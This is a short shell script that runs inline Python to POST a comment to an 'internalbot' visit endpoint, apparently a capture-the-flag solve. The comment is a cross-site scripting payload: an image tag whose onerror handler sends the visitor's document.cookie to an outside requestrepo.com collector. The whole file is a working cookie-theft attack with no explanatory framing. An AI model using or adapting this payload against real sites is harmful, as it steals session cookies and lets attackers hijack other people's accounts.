#!/bin/sh
/usr/bin/python3 - <<'PY'
import urllib.request
import json

url = 'http://internalbot:8000/visit'
data = {
    "comment": "<img src=x onerror=\"fetch('https://460w2vb2.requestrepo.com/?c=' + document.cookie)\">"
}
json_data = json.dumps(data).encode('utf-8')
req = urllib.request.Request(
    url=url,
    data=json_data,
    headers={'Content-Type': 'application/json'},
    method='POST'
)
urllib.request.urlopen(req)

PY
